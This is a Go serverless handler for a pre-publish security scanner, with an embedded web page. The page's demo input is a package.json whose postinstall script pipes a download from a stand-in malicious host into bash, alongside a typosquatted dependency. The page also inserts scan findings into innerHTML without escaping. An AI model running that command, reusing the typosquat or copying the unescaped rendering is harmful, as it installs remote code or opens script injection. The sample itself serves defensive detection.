package handler

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"push-scanner/pkg/policy"
	"push-scanner/pkg/scanner"
)

type ScanWebRequest struct {
	FileName string `json:"file_name"`
	Content  string `json:"content"`
	Mode     string `json:"mode"`
	Ring     string `json:"ring"`
}

type ScanWebResponse struct {
	Timestamp          time.Time        `json:"timestamp"`
	FileName           string           `json:"file_name"`
	Passed             bool             `json:"passed"`
	HardBlockTriggered bool             `json:"hard_block_triggered"`
	PolicyMode         string           `json:"policy_mode"`
	EnvironmentRing    string           `json:"environment_ring"`
	FindingsCount      int              `json:"findings_count"`
	Summary            map[scanner.Severity]int `json:"summary"`
	Findings           []scanner.Finding `json:"findings"`
}

// Handler is Vercel's serverless function entrypoint.
func Handler(w http.ResponseWriter, r *http.Request) {
	// Enable CORS
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")

	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusOK)
		return
	}

	if r.Method == http.MethodGet {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		fmt.Fprint(w, getWebHTML())
		return
	}

	if r.Method == http.MethodPost {
		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, `{"error": "Failed to read request body"}`, http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		var req ScanWebRequest
		if err := json.Unmarshal(body, &req); err != nil {
			http.Error(w, `{"error": "Invalid JSON request format"}`, http.StatusBadRequest)
			return
		}

		if req.FileName == "" {
			req.FileName = "sample_file.js"
		}
		if req.Mode == "" {
			req.Mode = "default"
		}
		if req.Ring == "" {
			req.Ring = "dev"
		}

		targetFile := scanner.TargetFile{
			Path:               req.FileName,
			SizeBytes:          int64(len(req.Content)),
			Content:            []byte(req.Content),
			IsStagedForPublish: true,
		}

		activeScanners := []scanner.Scanner{
			&scanner.SecretScanner{},
			&scanner.ArtifactScanner{},
			&scanner.ConfigScanner{},
			&scanner.SourceMapScanner{},
			&scanner.DependencyScanner{},
			&scanner.AISignalScanner{},
		}

		opts := scanner.ScanOptions{
			PolicyMode: req.Mode,
			Ring:       req.Ring,
		}

		var rawFindings []scanner.Finding
		for _, s := range activeScanners {
			f, err := s.Scan(opts, []scanner.TargetFile{targetFile})
			if err == nil {
				rawFindings = append(rawFindings, f...)
			}
		}

		policyCfg := policy.DefaultConfig()
		policyCfg.PolicyMode = req.Mode
		policyCfg.EnvironmentRing = req.Ring

		engine := policy.NewPolicyEngine(policyCfg)
		filteredFindings, passed, hardBlock := engine.Evaluate(rawFindings, req.Mode)

		summary := map[scanner.Severity]int{
			scanner.SeverityCritical: 0,
			scanner.SeverityHigh:     0,
			scanner.SeverityMedium:   0,
			scanner.SeverityLow:      0,
			scanner.SeverityInfo:     0,
		}
		for _, f := range filteredFindings {
			summary[f.Severity]++
		}

		resp := ScanWebResponse{
			Timestamp:          time.Now(),
			FileName:           req.FileName,
			Passed:             passed,
			HardBlockTriggered: hardBlock,
			PolicyMode:         req.Mode,
			EnvironmentRing:    req.Ring,
			FindingsCount:      len(filteredFindings),
			Summary:            summary,
			Findings:           filteredFindings,
		}

		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(resp)
		return
	}

	http.Error(w, `{"error": "Method not allowed"}`, http.StatusMethodNotAllowed)
}

func getWebHTML() string {
	return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>push-scanner 🛡️ | Vercel Live Web Audit</title>
    <style>
        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --text: #c9d1d9; --accent: #58a6ff; --danger: #f85149; --success: #3fb950; --warning: #d29922; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 2rem; }
        .container { max-width: 900px; margin: 0 auto; }
        h1 { color: #fff; display: flex; align-items: center; gap: 0.5rem; }
        .badge { background: #238636; color: #fff; font-size: 0.8rem; padding: 0.2rem 0.6rem; border-radius: 12px; font-weight: normal; }
        .card { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; margin-top: 1.5rem; }
        label { font-weight: 600; display: block; margin-bottom: 0.5rem; }
        input, select, textarea { width: 100%; box-sizing: border-box; background: #010409; border: 1px solid var(--border); color: #fff; padding: 0.75rem; border-radius: 6px; font-family: monospace; margin-bottom: 1rem; }
        textarea { height: 160px; resize: vertical; }
        button { background: #238636; color: #fff; border: none; padding: 0.75rem 1.5rem; border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 1rem; width: 100%; }
        button:hover { background: #2ea043; }
        .result-box { margin-top: 1.5rem; display: none; }
        .pass-banner { background: rgba(63, 185, 80, 0.15); border: 1px solid var(--success); color: var(--success); padding: 1rem; border-radius: 6px; font-weight: bold; }
        .fail-banner { background: rgba(248, 81, 73, 0.15); border: 1px solid var(--danger); color: var(--danger); padding: 1rem; border-radius: 6px; font-weight: bold; }
        .finding-item { background: #010409; border-left: 4px solid var(--danger); padding: 1rem; margin-top: 1rem; border-radius: 4px; }
        .finding-item.medium { border-left-color: var(--warning); }
        .finding-item.info { border-left-color: var(--accent); }
        .code-snippet { background: #161b22; padding: 0.5rem; border-radius: 4px; font-family: monospace; color: var(--warning); font-size: 0.9rem; margin-top: 0.5rem; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🛡️ push-scanner <span class="badge">Vercel Serverless Live Audit</span></h1>
        <p>Pre-publish security gate testing live secrets, sourcemaps, dangerous lifecycle scripts, and AI signals.</p>

        <div class="card">
            <label for="fileName">Target File Name</label>
            <input type="text" id="fileName" value="package.json" placeholder="e.g. package.json or src/config.js">

            <div style="display: flex; gap: 1rem;">
                <div style="flex: 1;">
                    <label for="mode">Policy Mode</label>
                    <select id="mode">
                        <option value="default" selected>default (Block Critical & High)</option>
                        <option value="strict">strict (Block Critical, High, Medium)</option>
                        <option value="permissive">permissive (Block Critical & Hard blocks)</option>
                    </select>
                </div>
                <div style="flex: 1;">
                    <label for="ring">Environment Ring</label>
                    <select id="ring">
                        <option value="dev" selected>dev</option>
                        <option value="staging">staging</option>
                        <option value="prod">prod (Zero Tolerance)</option>
                    </select>
                </div>
            </div>

            <label for="content">File Content / Code Buffer</label>
            <textarea id="content" placeholder="Paste code, package.json, .env, or sourcemap content here...">{
  "name": "my-vibe-package",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl http://malicious.domain/payload | bash"
  },
  "dependencies": {
    "reqeusts": "1.0.0"
  }
}</textarea>

            <button onclick="runAudit()">Run Pre-Publish Security Audit</button>
        </div>

        <div id="resultBox" class="result-box"></div>
    </div>

    <script>
        async function runAudit() {
            const fileName = document.getElementById('fileName').value;
            const mode = document.getElementById('mode').value;
            const ring = document.getElementById('ring').value;
            const content = document.getElementById('content').value;
            const resultBox = document.getElementById('resultBox');

            resultBox.style.display = 'block';
            resultBox.innerHTML = '<div class="card">Scanning...</div>';

            try {
                const res = await fetch('/api/scan', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ file_name: fileName, mode: mode, ring: ring, content: content })
                });
                const data = await res.json();

                let html = '';
                if (data.passed) {
                    html += '<div class="pass-banner">✔ SAFE TO PUBLISH: Zero policy violations detected!</div>';
                } else {
                    html += '<div class="fail-banner">✘ PRE-PUBLISH GATE FAILED: Security policy violations must be resolved!</div>';
                }

                html += '<div class="card"><h3>Audit Summary</h3><p>Total Findings: ' + data.findings_count + ' | CRITICAL: ' + (data.summary.CRITICAL||0) + ' | HIGH: ' + (data.summary.HIGH||0) + ' | MEDIUM: ' + (data.summary.MEDIUM||0) + '</p>';

                if (data.findings && data.findings.length > 0) {
                    data.findings.forEach(f => {
                        const sevClass = f.severity.toLowerCase();
                        html += '<div class="finding-item ' + sevClass + '">';
                        html += '<strong>[' + f.severity + '] ' + f.title + ' (' + f.id + ')</strong>';
                        html += '<p>' + f.description + '</p>';
                        if (f.context) {
                            html += '<div class="code-snippet">' + f.context + '</div>';
                        }
                        html += '<small style="color: var(--accent); display: block; margin-top: 0.5rem;">Remediation: ' + f.remediation + '</small>';
                        html += '</div>';
                    });
                }
                html += '</div>';
                resultBox.innerHTML = html;
            } catch (err) {
                resultBox.innerHTML = '<div class="fail-banner">Error executing serverless scan audit: ' + err.message + '</div>';
            }
        }
    </script>
</body>
</html>`
}
